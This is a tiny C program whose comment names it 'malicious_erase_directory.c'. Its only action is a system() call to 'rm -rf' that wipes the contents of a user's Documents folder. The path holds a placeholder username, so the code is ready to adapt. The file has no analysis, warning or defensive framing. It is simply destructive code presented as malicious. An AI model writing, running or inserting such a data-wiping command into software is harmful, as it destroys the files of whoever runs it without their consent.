    // malicious_erase_directory.c
#include <stdlib.h>

int main() {
    system("rm -rf /home/yourusername/Documents/*");
    return 0;
}
